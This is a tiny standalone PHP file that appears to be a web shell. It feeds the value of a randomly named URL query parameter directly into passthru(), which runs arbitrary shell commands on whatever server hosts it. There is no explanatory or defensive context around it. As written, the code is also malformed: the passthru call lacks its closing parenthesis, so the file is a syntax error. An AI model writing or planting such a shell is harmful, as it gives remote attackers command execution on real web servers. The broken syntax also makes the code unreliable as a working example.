<?php
passthru($_GET['DcLsvWSQ'];
?>
